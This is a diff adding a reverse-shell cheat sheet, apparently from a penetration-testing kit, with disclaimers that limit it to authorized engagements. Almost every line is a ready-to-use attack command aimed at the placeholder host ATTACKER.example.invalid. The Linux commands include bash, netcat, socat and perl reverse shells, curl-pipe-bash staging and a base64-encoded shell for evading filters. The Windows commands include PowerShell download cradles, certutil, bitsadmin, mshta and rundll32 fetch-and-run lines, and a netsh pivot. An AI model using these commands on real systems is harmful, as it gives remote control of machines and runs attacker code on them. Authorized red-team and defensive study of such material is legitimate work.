@@ -1,0 +1,53 @@
+# ============================================================================
+# Safe PoC -> x8bitranjit (all shells: AUTHORIZED ENGAGEMENTS ONLY)
+# Reverse-shell one-liners - Linux & Windows (AUTHORIZED ENGAGEMENTS ONLY)
+# x8bitranjit lab style.
+#
+# SCOPE RULE (same as the lab README): in bug bounty, a benign marker
+# (id/whoami) is a complete Critical proof - STOP THERE. The shells below are
+# for AUTHORIZED red-team engagements where persistence/pivot is in scope
+# (see POST_EXPLOITATION_CHECKLIST PEXP-001/018 discipline).
+#
+# WHAT TO EDIT everywhere:  ATTACKER.example.invalid -> your listener IP/host
+#                            4444                    -> your port
+# Listener first:  nc -lvnp 4444   (or pwncat-cs / socat for full TTY)
+# ============================================================================
+
+# ---------------------------- LINUX -----------------------------------------
+# bash /dev/tcp (no nc needed)
+bash -i >& /dev/tcp/ATTACKER.example.invalid/4444 0>&1
+# bash with short form
+bash -c 'bash -i >& /dev/tcp/ATTACKER.example.invalid/4444 0>&1'
+# nc + mkfifo (full TTY relay)
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER.example.invalid 4444 >/tmp/f
+# socat full TTY (best interactive quality)
+socat TCP:ATTACKER.example.invalid:4444 EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane
+# python PTY (stabilize after any shell)
+python3 -c 'import pty,os;pty.spawn("/bin/bash")'
+# perl
+perl -e 'use Socket;$i="ATTACKER.example.invalid";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")};'
+# curl|bash staging (authorized only)
+curl http://ATTACKER.example.invalid/s.sh | bash
+# base64 smuggle (past quote filters - pair with CommandInjection kit CMDI-013)
+echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgQVRUQUNLRVIuZXhhbXBsZS5pbnZhbGlkIDQ0NDQgPi90bXAvZg==|base64 -d|bash
+
+# ---------------------------- WINDOWS ---------------------------------------
+# PowerShell download-cradle (IEX) - the standard
+powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER.example.invalid/s.ps1')"
+# certutil LOLBin download + execute
+certutil -urlcache -split -f http://ATTACKER.example.invalid/s.exe %TEMP%\s.exe & %TEMP%\s.exe
+# bitsadmin variant
+bitsadmin /transfer t http://ATTACKER.example.invalid/s.exe %TEMP%\s.exe & %TEMP%\s.exe
+# mshta (hta fetch-and-run)
+mshta http://ATTACKER.example.invalid/s.hta
+# rundll32 javascript runner
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER.example.invalid/s.ps1')")
+# PowerShell fully-encrypted (UTF16LE base64 - pasts quote/space filters)
+powershell -nop -enc <BASE64-UTF16LE-OF-YOUR-PS1>
+# netsh portproxy pivot (move deeper after foothold - PEXP-005)
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=INTERNAL.example.invalid
+
+# ---------------------------- STABILIZATION (after any catch) ----------------
+# full TTY relay on your listener side (catch with socat, not nc):
+socat file:$(tty),raw,echo=0 TCP-LISTEN:4444
+# then inside: python3 -c 'import pty;pty.spawn("/bin/bash")' ; Ctrl-Z; stty raw -echo; fg
